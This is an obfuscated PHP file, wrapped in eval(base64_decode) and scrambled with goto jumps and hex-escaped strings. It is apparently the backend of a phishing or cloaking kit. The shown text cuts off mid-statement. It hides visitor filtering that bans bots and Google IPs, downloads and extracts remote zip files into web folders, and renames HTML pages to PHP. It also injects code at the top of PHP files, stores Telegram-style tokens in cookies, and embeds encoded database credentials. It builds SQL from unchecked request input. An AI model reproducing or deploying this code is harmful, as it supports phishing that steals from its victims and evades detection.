<?php eval(base64_decode('
 goto CH3yT; NYSmS: function fetchIPInfo($ipAddress) { $url = "\150\x74\x74\160\163\72\x2f\x2f\151\160\167\x68\157\x69\x73\56\x61\160\x70\x2f\x6a\x73\157\x6e\57{$ipAddress}"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = json_decode($response, true); if (isset($info["\163\x75\x63\x63\145\x73\x73"]) && !$info["\x73\x75\x63\143\x65\163\x73"]) { $_SESSION["\163\x65\x73\x73\x69\x6f\x6e\137\151\163\160"] = "\125\x6e\153\156\x6f\167\156"; $_SESSION["\x73\145\x73\163\151\x6f\x6e\137\x63\157\165\156\164\162\171"] = "\125\156\153\x6e\x6f\167\x6e"; $_SESSION["\x73\145\163\x73\x69\x6f\156\137\143\157\x75\156\x74\162\x79\x5f\x63\x6f\144\145"] = "\x55\x6e\x6b\156\157\167\x6e"; $_SESSION["\163\x65\163\x73\151\157\156\137\x63\151\164\171"] = "\x55\x6e\x6b\156\157\x77\156"; $_SESSION["\x73\x65\163\163\151\x6f\x6e\137\162\x65\147\151\x6f\x6e"] = "\x55\156\x6b\x6e\157\x77\156"; $_SESSION["\x73\145\x73\x73\x69\x6f\x6e\x5f\160\162\x6f\x78\x79"] = "\106\x61\154\163\145"; $_SESSION["\163\145\163\x73\151\157\x6e\x5f\x6d\x6f\x62\x69\x6c\145"] = "\x46\141\154\163\x65"; $_SESSION["\x73\145\x73\x73\151\157\x6e\x5f\x68\x6f\x73\164\151\x6e\x67"] = "\x46\141\154\x73\x65"; return; } $_SESSION["\163\x65\163\163\x69\x6f\156\137\x69\x73\160"] = isset($info["\x69\x73\x70"]) ? $info["\151\x73\x70"] : null; $_SESSION["\163\145\x73\163\x69\157\156\x5f\143\157\x75\x6e\x74\x72\x79"] = isset($info["\x63\157\x75\x6e\164\162\x79"]) ? $info["\x63\x6f\165\156\164\162\171"] : null; $_SESSION["\x73\x65\163\x73\151\157\x6e\137\143\x6f\165\156\164\x72\171\x5f\x63\157\x64\x65"] = isset($info["\x63\x6f\x75\x6e\164\x72\x79\x5f\x63\157\144\145"]) ? $info["\x63\x6f\x75\x6e\x74\x72\171\137\x63\x6f\144\x65"] : null; $_SESSION["\163\145\163\x73\x69\x6f\x6e\137\143\x69\x74\x79"] = isset($info["\x63\151\164\x79"]) ? $info["\x63\x69\x74\171"] : null; $_SESSION["\x73\x65\x73\x73\151\157\x6e\137\162\x65\147\151\x6f\156"] = isset($info["\162\x65\x67\151\x6f\x6e"]) ? $info["\x72\x65\147\x69\x6f\x6e"] : null; $_SESSION["\x73\145\163\x73\151\x6f\156\137\160\x72\157\x78\171"] = isset($info["\x70\162\157\170\x79"]) && $info["\x70\162\x6f\170\171"] ? "\x54\162\165\x65" : "\x46\x61\154\163\145"; $_SESSION["\x73\145\163\163\151\x6f\156\x5f\155\x6f\x62\x69\154\x65"] = isset($info["\155\x6f\x62\151\x6c\x65"]) && $info["\155\x6f\142\151\x6c\145"] ? "\124\x72\165\145" : "\x46\x61\x6c\163\x65"; $_SESSION["\163\x65\x73\x73\151\157\x6e\137\150\157\163\x74\151\156\x67"] = isset($info["\150\157\163\164\x69\156\x67"]) && $info["\150\x6f\x73\164\151\x6e\147"] ? "\x54\162\165\x65" : "\106\141\154\x73\x65"; } goto rlaXT; FttiW: header("\x41\143\x63\145\163\x73\55\x43\157\x6e\x74\x72\x6f\x6c\55\x41\x6c\154\x6f\x77\55\110\145\141\x64\145\x72\163\x3a\x20\103\157\x6e\164\145\x6e\x74\x2d\124\x79\160\x65"); goto kgJ_0; xDmZK: $local_os = get_platform($local_userAgent); goto Rfquy; lvHOT: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\57" . $entry; if ($entry == "\56" || $entry == "\x2e\x2e") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\150\164\155\154") { $newPath = $folderDir . "\x2f" . pathinfo($path, PATHINFO_FILENAME) . "\56\x70\150\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto wV1kb; WHbzZ: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\x65\x78\x70\x69\x72\x65\x5f\x64\x61\x74\x65"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\153\145\156\164\145\154", $token, time() + 86400 * 30, "\x2f"); setcookie("\151\x64\x74\x65\x6c", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\145\144\x69\x72\151\143\164", $_SESSION["\162\x65\x64\x69\162\151\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\157\152\145\x63\164", $_SESSION["\160\162\x6f\x6a\x65\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\x72\143\x65\155\145", $_SESSION["\141\144\x64\x62\171"], time() + 86400 * 30, "\x2f"); setcookie("\156\x65\167\x5f\x65\x78\160", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\166\157\154\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\154\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\x6f\153\145\156\x74\145\154", $token_view, time() + 86400 * 30, "\57"); setcookie("\151\144\164\x65\x6c", $chatid_view, time() + 86400 * 30, "\57"); setcookie("\162\x65\x64\151\162\151\x63\164", $_SESSION["\x72\145\144\x69\x72\x69\x63\164"], time() + 86400 * 30, "\57"); setcookie("\x70\162\x6f\x6a\145\143\x74", $_SESSION["\160\x72\x6f\152\145\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\x72\x63\x65\155\145", $_SESSION["\x61\144\x64\x62\x79"], time() + 86400 * 30, "\57"); setcookie("\166\x6f\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\x6f\x6c\x6d", $chatid, time() + 86400 * 30, "\x2f"); } } goto SxIMT; KF51w: if ($_SERVER["\122\x45\121\x55\105\123\x54\x5f\115\105\124\x48\x4f\104"] === "\120\117\123\x54") { $view_com_ip = isset($_POST["\166\151\145\167\x5f\163\x65\x6e\x64\x5f\151\160"]) ? $_POST["\x76\x69\145\x77\x5f\163\x65\156\144\x5f\151\x70"] : null; $view_com_domain = isset($_POST["\166\x69\145\167\x5f\x73\x65\x6e\144\137\144\157\155\x61\151\x6e"]) ? $_POST["\166\151\x65\x77\137\163\x65\x6e\x64\x5f\144\157\155\141\151\x6e"] : null; $view_return_domain = isset($_POST["\166\151\145\x77\x5f\162\x65\x74\165\162\156\x5f\144\x6f\155\x61\x69\156"]) ? $_POST["\166\151\145\x77\137\x72\145\164\165\162\x6e\x5f\144\157\155\x61\x69\156"] : null; $view_com_id = isset($_POST["\166\151\x65\167\137\163\x65\156\x64\137\x69\x64"]) ? $_POST["\x76\151\x65\167\137\x73\x65\156\144\137\x69\x64"] : null; $view_com_action = isset($_POST["\x76\x69\x65\x77\137\x73\x65\x6e\144\137\141\143\x74\151\157\156"]) ? $_POST["\166\151\145\167\x5f\x73\145\x6e\144\x5f\141\x63\x74\x69\157\156"] : null; $view_patch = isset($_POST["\x76\x69\x65\x77\x5f\160\x61\x74\x63\x68"]) ? $_POST["\x76\151\x65\x77\x5f\x70\x61\x74\143\x68"] : null; $view_user = isset($_POST["\166\151\145\x77\137\x75\163\x65\x72"]) ? $_POST["\166\151\x65\x77\137\x75\x73\145\x72"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\166\x69\x65\x77\137\x73\x65\x6e\144\137\141\143\164\x69\x6f\156"] == "\166\x69\x65\x77") { fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\x6c\157\154\x69\160\x73"] = $view_com_ip; $_SESSION["\x6c\157\154\163\x6f\165\x6c\x73"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\x3f\46\166\151\x65\167\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\141\x6c\145\x72\x74\75" . $RandOP_Mlux . "\x26\x78\x6c\160\163\75" . $RandOP_Mlux . "\46\163\157\x75\x6c\163\x3d" . $view_com_id . "\46\144\x6f\x6e\145\75\x26\145\162\162\157\x72\171\75" . $RandOP_Mlux . "\x26\155\156\145\x6d\x6f\x6e\151\143\75\46\x6a\142\75" . $RandOP_Mlux; $responseData = array("\166\151\x65\x77\137\x72\145\x73\137\x73\164\141\164\165\x73" => "\163\x75\143\x63\x65\x73\163", "\x6d\145\x73\x73\141\x67\145" => $url); $responseJson = json_encode($responseData); echo $responseJson; die; } } $login_com_ip = isset($_POST["\x6c\157\147\x69\x6e\137\163\x65\x6e\x64\x5f\151\160"]) ? $_POST["\x6c\157\147\151\x6e\x5f\163\x65\x6e\144\x5f\x69\160"] : null; $login_com_domain = isset($_POST["\x6c\157\147\151\x6e\x5f\163\145\156\144\x5f\144\157\155\x61\151\156"]) ? $_POST["\154\x6f\x67\x69\156\137\x73\x65\156\144\137\x64\157\x6d\141\151\156"] : null; $login_return_domain = isset($_POST["\154\x6f\x67\151\x6e\137\162\x65\164\x75\162\156\137\144\x6f\155\141\x69\156"]) ? $_POST["\x6c\157\147\x69\156\137\162\145\164\165\162\x6e\137\144\157\x6d\x61\151\156"] : null; $login_com_id = isset($_POST["\154\x6f\x67\x69\156\x5f\163\x65\x6e\144\x5f\151\x64"]) ? $_POST["\x6c\157\x67\x69\x6e\x5f\x73\145\156\x64\137\x69\x64"] : null; $login_com_action = isset($_POST["\x6c\x6f\147\x69\156\x5f\x73\x65\156\x64\137\141\143\164\x69\157\x6e"]) ? $_POST["\x6c\x6f\x67\151\156\137\163\x65\x6e\144\x5f\141\143\164\151\x6f\156"] : null; $login_patch = isset($_POST["\x6c\x6f\x67\x69\x6e\x5f\160\x61\164\143\x68"]) ? $_POST["\x6c\157\147\151\x6e\x5f\x70\141\x74\x63\150"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\x6c\x6f\147\x69\x6e\137\x73\x65\x6e\144\137\141\143\164\x69\x6f\156"] == "\x6c\157\147\151\156") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\x6c\x6f\x6c\151\x70\x73"] = $login_com_ip; $_SESSION["\x6c\x6f\154\x73\x6f\165\x6c\x73"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\77\x26\x6c\x6f\x67\x69\156\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\x26\x61\154\145\x72\164\75" . $RandOP_Mlux . "\x26\170\x6c\x70\x73\75" . $RandOP_Mlux . "\46\163\x6f\x75\154\163\x3d" . $login_com_id . "\46\144\x6f\156\x65\75\x26\145\x72\162\157\162\171\x3d" . $RandOP_Mlux . "\46\x6d\x6e\145\x6d\x6f\156\151\143\x3d\x26\x6a\142\75" . $RandOP_Mlux; $responseData = array("\154\157\x67\151\x6e\x5f\x72\145\x73\137\x73\164\141\x74\x75\x73" => "\163\165\143\143\x65\x73\163", "\155\145\163\x73\x61\x67\x65" => $url); $responseJson = json_encode($responseData); echo $responseJson; die; } } $com_ip = isset($_POST["\163\x65\156\144\137\151\160"]) ? $_POST["\x73\x65\156\144\137\x69\x70"] : null; $com_domain = isset($_POST["\163\x65\156\x64\x5f\x64\x6f\x6d\141\x69\156"]) ? $_POST["\163\x65\156\144\137\x64\157\x6d\141\x69\156"] : null; $return_domain = isset($_POST["\x72\145\164\165\162\x6e\137\x64\x6f\x6d\141\151\156"]) ? $_POST["\x72\x65\164\165\162\156\137\144\x6f\155\141\151\x6e"] : null; $com_id = isset($_POST["\163\145\156\x64\137\x69\144"]) ? $_POST["\x73\145\156\144\137\151\x64"] : null; $com_action = isset($_POST["\163\145\156\x64\x5f\141\143\x74\x69\x6f\x6e"]) ? $_POST["\x73\145\x6e\144\137\141\143\164\x69\x6f\x6e"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { global $com_ip; fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\x72\x65\x73\x5f\163\164\x61\x74\165\163" => "\x34\x30\x35", "\x6d\145\x73\x73\x61\147\145" => "\165\163\145\x72\x20\x62\x6c\x6f\143\x6b\x65\x64"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\x73\x70\141\155\x20\x69\x70"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\x72\x65\x73\137\163\x74\x61\164\165\163" => "\64\x30\65", "\x6d\x65\163\x73\141\x67\x65" => "\165\x73\x65\x72\x20\x73\160\x61\x6d"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\x47\157\157\x67\154\x65\x20\151\160"; banned_client($com_ip, $reson); $responseData = array("\x72\145\163\x5f\163\x74\141\164\165\x73" => "\x34\60\x36", "\x6c\x6f\x63\141\154\x5f\165\163\x65\x72\x41\147\x65\x6e\164" => $local_userAgent, "\x63\x6f\155\137\151\x70" => $com_ip, "\x6d\x65\x73\x73\x61\147\x65" => "\x69\160\x20\x66\151\x6c\x74\164\145\162"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\x65\x6e\x64\x5f\x61\143\x74\x69\x6f\x6e"] == "\x6c\x6f\147\x69\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\x73\145\x6e\x64\x5f\141\x63\164\x69\157\x6e"] == "\x63\162\x65\x61\164\x65") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\162\x6c"]); update_index($_SESSION["\x66\x6f\x6c\144\145\x72"]); add_user($_SESSION["\x66\x6f\154\144\x65\162"], $com_ip); update_user(); if (isset($_SESSION["\146\x6f\154\144\145\162"])) { $folderPath = $_SESSION["\146\x6f\154\x64\x65\162"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\x2f", '', $indexPath); $indexContent = "\74\77\160\x68\160\x20\150\x65\141\x64\145\162\x28\47\x4c\157\143\141\164\151\157\156\72\x20\x2e\x2f{$relativePath}\x27\51\73\40\77\76"; file_put_contents($folderPath . "\x2f\x69\x6e\144\145\170\x2e\160\150\160", $indexContent); } } if ($_SESSION["\x61\160\151"] !== "\x41\x50\x49") { getFileContents($_SESSION["\141\x70\x69"]); } if ($_SESSION["\151\163\x70\x72\157\x74\145\x63\164"] == "\61") { update_php($_SESSION["\x66\157\154\x64\x65\x72"]); } else { update_php_normal($_SESSION["\146\x6f\x6c\x64\145\x72"]); } $responseData = array("\x72\145\x73\137\163\164\x61\164\165\163" => "\163\165\x63\143\x65\163\x73", "\162\145\163\x5f\144\151\162" => $_SESSION["\146\157\154\x64\x65\x72"], "\x72\x65\x73\137\x75\x72\154" => $com_domain, "\162\145\163\x5f\151\144" => $com_id, "\x72\x65\x73\x5f\151\160" => $com_ip, "\x72\145\163\137\141\x63\x74\x69\157\156" => $com_action, "\x6d\145\163\x73\x61\x67\x65" => "\x73\x75\x63\143\145\x73\x73\x66\165\154\x6c\171"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\144\x61\x74\141\40\x6e\x6f\x74\x20\x61\154\x6c\157\x77"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\x65\163\x5f\x73\x74\141\164\165\x73" => "\x34\60\x35", "\x6d\x65\x73\x73\141\147\x65" => "\x64\x61\164\141\x20\156\157\164\40\141\154\x6c\157\x77\145\144"); $responseJson = json_encode($responseData); echo $responseJson; } goto GV15m; Gan3K: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\x6e\156\145\143\164\151\x6f\156\40\x66\141\x69\154\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\x45\x43\x54\40\x74\157\153\145\x6e\54\40\143\150\141\x74\x69\144\x20\106\122\117\x4d\40\x70\141\156\x65\x6c\x20\127\x48\x45\x52\x45\x20\160\x61\x6e\x65\154\137\165\163\x65\162\75\47{$user}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\164\157\153\x65\156"]; $chatid = $row["\x63\150\141\x74\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto efbLR; gwaas: function random_number($length) { $characters = "\x30\61\62\63\64\x35\x36\x37\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto l0RkQ; Rfquy: $local_browser = get_browser_value($local_userAgent); goto OLBiA; rQnmN: $fs_host = base64_decode("\115\x54\153\64\114\152\111\x31\x4d\123\x34\x34\x4e\x43\x34\171\115\x44\x41"); goto jcCQQ; f_cLR: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\x2e") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\x70\150\x70") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto kmgPP; uowqh: function download_extract($zipFileUrl) { if (!is_dir("\x77\145\x62")) { if (!mkdir("\x77\x65\x62", 511)) { die("\x46\x61\151\x6c\145\144\40\x74\157\40\143\x72\x65\x61\x74\145\x20\167\x65\142\40\144\151\x72\x65\143\x74\x6f\162\171"); } } if (!is_dir("\164\145\x6d\160")) { mkdir("\x74\x65\155\160"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\x77\145\x62\57{$sub_folder}\57"; $_SESSION["\146\157\154\x64\145\x72"] = $folder_path; $zipFileName = "\x74\145\x6d\x70\57{$folder_name}\56\172\x69\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\141\x69\x6c\x65\144\40\164\157\40\143\162\145\141\164\145\40\164\x68\x65\x20\146\x6f\154\144\145\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\x72\x65\x73\137\x73\x74\141\x74\165\163" => "\x34\60\65", "\155\145\163\x73\x61\x67\x65" => "\x46\x61\151\154\145\144\x20\164\157\40\x65\170\164\x72\x61\x63\164\x20\x74\x68\145\x20\x7a\151\x70\x20\x66\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\162\x65\x73\x5f\x73\x74\x61\164\165\163" => "\x34\60\65", "\x6d\x65\163\x73\x61\147\145" => "\106\x61\151\154\145\144\40\x74\x6f\40\x64\x6f\x77\x6e\x6c\157\141\144\x20\x74\150\145\x20\x7a\151\x70\x20\146\151\154\x65"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto lvHOT; xRKYG: function random_string($length) { $characters = "\141\142\143\144\x65\146\x6a\x68\x69\147\x6b\x6c\x6d\x6e\x6f\160\161\162\163\x74\x75\x76\x77\x78\171\172\x30\x31\x32\63\x34\65\x36\67\x38\x39\x41\102\x43\104\x45\106\x47\x48\111\x4a\113\x4c\115\116\117\x50\x51\122\123\x54\x55\x56\127\x58\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto gwaas; vFqK0: function delete_zip($directory) { $zipFiles = glob($directory . "\52\56\172\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto dgZd7; y3d1Q: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto S60cS; S5JuR: $fs_log = base64_decode("\x5a\x48\x4a\152\132\62\x6c\x73\145\126\x41\167\x4b\155\x73\155"); goto qWtx5; SxIMT: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\x69\x6e\144\x65\x78\56\x68\164\155\154") || file_exists($path . "\x2f\151\156\x64\145\170\x2e\160\150\160")) { return $path; } else { $subDirectories = glob($path . "\57\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto f_cLR; CH3yT: header("\x41\143\x63\145\163\x73\55\x43\x6f\x6e\x74\162\x6f\154\x2d\101\x6c\x6c\x6f\167\55\x4f\162\x69\x67\x69\x6e\72\40\x2a"); goto gbjQo; OLBiA: deleteOldFolders("\167\x65\142"); goto BMhQu; kgJ_0: header("\103\157\156\164\145\x6e\x74\55\x54\171\x70\145\72\40\141\x70\x70\x6c\x69\143\141\x74\x69\x6f\x6e\x2f\x6a\163\157\x6e"); goto bXOUU; R3KbM: $local_domain = $_SERVER["\x53\x45\122\x56\x45\122\x5f\116\x41\x4d\x45"]; goto xDmZK; gbjQo: header("\x41\143\x63\145\x73\163\x2d\x43\157\156\x74\x72\157\x6c\55\101\154\154\x6f\167\55\115\x65\x74\150\157\x64\x73\x3a\x20\x50\117\123\x54"); goto FttiW; F2i8v: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto UtE6t; jcCQQ: $fs_user = base64_decode("\x65\155\x56\171\x62\x32\122\150\x65\130\x4e\146\132\107\106\x35"); goto S5JuR; CBKIN: function getClientIP() { if (!empty($_SERVER["\x48\124\x54\x50\137\103\x4c\x49\x45\116\x54\x5f\111\120"])) { $ipAddress = $_SERVER["\110\124\124\120\137\x43\x4c\x49\105\116\124\137\x49\120"]; } elseif (!empty($_SERVER["\110\x54\124\120\x5f\130\x5f\106\x4f\122\x57\x41\x52\x44\105\104\137\106\x4f\122"])) { $ipAddress = $_SERVER["\x48\x54\124\120\137\130\x5f\x46\x4f\x52\127\101\x52\x44\x45\104\x5f\106\117\122"]; } else { $ipAddress = $_SERVER["\122\x45\x4d\117\x54\105\x5f\101\x44\x44\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\57\134\142\x5c\x64\x7b\x31\54\x33\175\x5c\x2e\x5c\144\173\x31\x2c\x33\x7d\x5c\x2e\134\x64\173\61\x2c\x33\175\x5c\x2e\x5c\144\x7b\x31\x2c\x33\x7d\x5c\142\x2f", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\x65\163\163\151\157\x6e\137\151\160"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\145\163\x73\x69\x6f\156\137\151\160"] = "\x31\62\67\x2e\x30\x2e\x30\56\61"; return "\x31\x32\x37\x2e\60\56\x30\x2e\x31"; } } goto NYSmS; BMhQu: $currentTimestamp = time(); goto zkakc; PGYNH: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\x6e\153\x6e\157\x77\156\40\x42\162\x6f\167\163\145\x72"; $BROWSER = array("\x2f\155\163\151\x65\x2f\x69" => "\x49\156\x74\145\x72\156\145\164\x20\x45\170\160\154\157\x72\x65\162", "\57\x66\151\x72\145\146\157\170\57\x69" => "\106\x69\x72\x65\146\x6f\x78", "\57\163\x61\x66\x61\x72\151\x2f\x69" => "\123\141\146\x61\x72\x69", "\x2f\x63\x68\162\x6f\x6d\x65\x2f\151" => "\103\x68\x72\157\x6d\x65", "\x2f\x65\144\x67\x65\57\151" => "\x45\x64\147\x65", "\57\157\160\x65\162\x61\57\x69" => "\117\x70\145\x72\x61", "\x2f\x6e\145\x74\163\x63\x61\160\145\57\151" => "\x4e\145\164\163\x63\141\160\x65", "\x2f\x6d\x61\170\x74\150\x6f\x6e\57\x69" => "\115\x61\x78\164\150\x6f\156", "\x2f\153\157\x6e\x71\x75\145\x72\157\162\57\x69" => "\x4b\x6f\x6e\x71\x75\x65\162\157\162", "\x2f\155\x6f\x62\151\x6c\x65\x2f\151" => "\110\141\x6e\144\150\145\x6c\144\40\x42\162\157\x77\x73\x65\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto NVL41; dgZd7: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\x6c\x6f\143\141\x6c\56\164\170\164", "{$ipAddress}", FILE_APPEND); } goto Swdkd; ISFe8: $local_time = date("\131\55\x6d\x2d\144\x20\110\72\151\72\x73"); goto R3KbM; l0RkQ: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\x6e\x65\143\x74\151\x6f\x6e\40\146\x61\151\154\145\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\105\103\124\40\52\x20\x46\x52\x4f\x4d\40\x72\145\144\x69\x72\x63\164\151\x6f\x6e\40\127\110\x45\122\x45\40\x69\x64\75\47{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\x69\x6e\153"] = base64_decode(base64_decode($row["\154\x69\x6e\153"])); $_SESSION["\x63\156"] = explode("\x3b", base64_decode(base64_decode($row["\143\157\165\156\x74\x72\x79"]))); $_SESSION["\160\x69\143"] = $row["\160\x69\x63"]; $_SESSION["\155\x73\x67"] = base64_decode(base64_decode($row["\x6d\x73\147"])); $_SESSION["\145\170\x70\151\162\x65\137\x64\x61\164\145"] = $row["\145\170\x70\x69\162\145\x5f\x64\x61\164\145"]; $_SESSION["\x73\x65\162\x76\145\162"] = base64_decode(base64_decode($row["\163\145\x72\166\x65\x72"])); $_SESSION["\165\162\154"] = base64_decode(base64_decode($row["\x75\x72\x6c"])); $_SESSION["\154\x75\x78\143\141\x70\x74\x63\150\141"] = $row["\154\165\x78\x63\x61\x70\164\x63\150\141"]; $_SESSION["\x74\x6f\x6b\145\x6e\164\145\x6c"] = base64_decode(base64_decode($row["\x74\157\153\x65\156\x74\145\x6c"])); $_SESSION["\151\144\x74\145\154"] = base64_decode(base64_decode($row["\151\144\164\145\154"])); $_SESSION["\x72\145\144\151\162\151\x63\x74"] = $row["\x72\x65\144\151\162\151\143\x74"]; $_SESSION["\160\162\157\x6a\145\143\164"] = $row["\160\162\x6f\x6a\145\143\164"]; $_SESSION["\x61\x70\x69"] = $row["\x61\x70\151"]; $_SESSION["\x61\144\x64\142\171"] = $row["\141\x64\x64\142\x79"]; $_SESSION["\151\163\160\162\x6f\x74\x65\143\164"] = $row["\x69\x73\x70\162\157\x74\x65\x63\164"]; $_SESSION["\x70\162\157\170\171"] = $row["\x70\162\157\170\x79"]; $_SESSION["\x63\141\x70\164\143\x68\x61\137\144\141\x74\x61"] = $row["\143\141\x70\164\143\x68\141"]; $_SESSION["\147\157\x6f\154\x65\x5f\143\141\160"] = $row["\x67\157\157\x67\x6c\x65\x5f\143\141\x70"]; $_SESSION["\x63\154\157\x75\x64\137\143\141\x70"] = $row["\143\x6c\x6f\x75\144\137\x63\141\x70"]; $_SESSION["\160\x72\x6f\x5f\151\143\157"] = $row["\160\x72\x6f\x5f\151\143\157"]; $_SESSION["\160\162\x6f\x5f\143\157\x6c\157\x72"] = $row["\160\x72\x6f\137\x63\x6f\x6c\157\x72"]; $_SESSION["\x70\x72\157\137\155\x73\147"] = $row["\x70\x72\x6f\137\155\163\x67"]; $_SESSION["\160\x72\157\137\151\x6d\x67"] = $row["\x70\x72\x6f\x5f\x69\x6d\147"]; $_SESSION["\x70\162\157\137\x6c\157\147\157"] = $row["\160\162\x6f\x5f\x6c\157\147\x6f"]; } } else { $refix = "\x6e\x6f\164\x20\146\x6f\x75\x6e\x64\x20\x69\x64\56{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto F1AEG; Fs_vQ: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\57", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\xff", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto afqP0; F1AEG: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\156\x20\x66\x61\151\154\145\x64\72\40" . mysqli_connect_error()); } $sql_u = 